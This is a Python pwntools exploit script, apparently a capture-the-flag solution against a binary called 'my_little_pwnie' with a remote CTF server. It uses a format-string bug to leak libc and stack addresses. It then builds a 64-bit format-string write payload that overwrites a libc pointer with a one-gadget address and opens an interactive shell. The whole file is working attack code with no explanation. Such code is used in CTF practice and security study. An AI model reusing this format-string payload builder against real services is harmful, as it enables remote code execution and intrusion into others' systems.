from pwn import *
import sys

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

def get_length(a,b):
    while hex(a)[-4:] != b:
        a = a + 1
    return a

def fstring_payload_64(addr, offset, waddr):
    addr = hex(addr).replace("0x","")
    if len(addr) < 16:
        addr = addr.rjust(16,"0")
    var1 = int(addr[-4:],16)
    s2 = addr[-8:-4]
    s3 = addr[-12:-8]
    var2 = get_length(var1,s2) - var1
    var3 = get_length(var1 + var2, s3) - var2 - var1
    payload = "%{}c%{}$hn%{}c%{}$hn%{}c%{}$hn".format(var1,offset+5,var2,offset+6,var3,offset+7).ljust(40,"a")
    payload += (p64(waddr) + p64(waddr+2) + p64(waddr+4))
    return payload

if len(sys.argv) > 1:
    io = remote("pwnie.zajebistyc.tf",17003)

else:
    io = process("./my_little_pwnie")
    gdb.attach(io)

io.sendline("%9$p%11$p")
leak = int(io.recv(14),16)
stack = int(io.recv(14),16)
retaddr = stack - 0x178
io.recvline()
libc.address = leak - 0x3fc39f
log.info("libc -> "+hex(libc.address))
log.info("stack -> "+hex(stack))
log.info("retaddr -> "+hex(retaddr))

gadget = libc.address + 0x4f432

log.info("gadget -> "+hex(gadget))
payload = fstring_payload_64(gadget, 6, libc.address + 0x3eb048)
io.sendline(payload)

io.interactive()
